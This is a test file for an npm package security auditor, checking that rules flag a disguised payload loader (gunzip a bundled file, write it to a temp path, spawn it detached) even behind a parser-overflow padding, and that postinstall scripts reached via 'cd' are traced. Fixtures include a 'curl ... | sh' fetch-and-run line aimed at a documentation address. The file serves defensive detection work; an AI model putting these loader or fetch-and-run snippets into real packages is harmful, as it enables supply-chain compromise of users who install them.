import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { runRules } from "../src/index.js";
import type { AuditInput, PackageFile } from "../src/types.js";

// Core closing review: renamed destructured imports under an overflow pad, and
// scripts reached after `cd`.

const CURL_SH = "curl -s http://198.51.100.1/x | sh"; // RFC 5737 documentation address

function file(path: string, content: string): PackageFile {
  return { path, content, size: Buffer.byteLength(content), changed: false };
}
function inputFor(files: Record<string, string>, pkgJson: object): AuditInput {
  const list = Object.entries(files).map(([p, c]) => file(p, c));
  list.push(file("package/package.json", JSON.stringify(pkgJson)));
  return {
    meta: {
      name: "probe", version: "1.0.0", author: null, maintainers: [], license: null,
      hasInstallScripts: false, signature: "unknown", provenance: "unknown", integrity: null,
      unpackedSize: 0, fileCount: list.length,
    },
    files: list,
    mode: "full",
  };
}

const RENAMED = `
const {readFileSync:r,writeFileSync:w}=require("fs");const {spawn:go}=require("child_process");const {gunzipSync:g}=require("zlib");
const path=require("path"),os=require("os");
const o=path.join(os.tmpdir(),".x");
w(o,g(r(path.join(__dirname,"intro.js"))));
go(o,[],{detached:true});`;
const PAD = `${"(".repeat(100000)}x${")".repeat(100000)};\n`;
const loader = (src: string) =>
  runRules(inputFor({ "package/index.js": src }, { name: "p", main: "index.js" })).filter((f) => f.ruleId === "native-payload-loader");

describe("renamed destructured imports under an overflow pad", () => {
  test("the chain is critical on its own and still critical with the pad", () => {
    assert.ok(loader(RENAMED).some((f) => f.severity === "critical"), "control: critical without the pad");
    assert.ok(loader(PAD + RENAMED).some((f) => f.severity === "critical"), "must stay critical with the pad");
  });

  test("a benign file that only destructures readFileSync plus the pad stays non-critical", () => {
    const f = loader(`${PAD}const {readFileSync:r}=require("fs");module.exports=()=>r("a");`);
    assert.ok(!f.some((x) => x.severity === "critical"));
    assert.equal(f.length, 0, "one signal is not a finding");
  });
});

describe("scripts reached after `cd`", () => {
  const crit = (files: Record<string, string>, cmd: string) =>
    runRules(inputFor(files, { scripts: { postinstall: cmd } })).filter((x) => x.ruleId === "install-scripts" && x.severity === "critical");

  test("`cd scripts && sh setup.sh`", () => {
    assert.equal(crit({ "package/scripts/setup.sh": `${CURL_SH}\n` }, "cd scripts && sh setup.sh").length, 1);
  });

  test("`cd scripts && ./setup`", () => {
    assert.equal(crit({ "package/scripts/setup": `${CURL_SH}\n` }, "cd scripts && ./setup").length, 1);
  });

  test("`cd scripts; node run` resolves scripts/run.js", () => {
    assert.equal(crit({ "package/scripts/run.js": `${CURL_SH}\n` }, "cd scripts; node run").length, 1);
  });

  test("an operand that names nothing still resolves nothing", () => {
    assert.equal(crit({ "package/scripts/other.sh": `${CURL_SH}\n` }, "cd scripts && sh setup.sh").length, 0);
  });
});
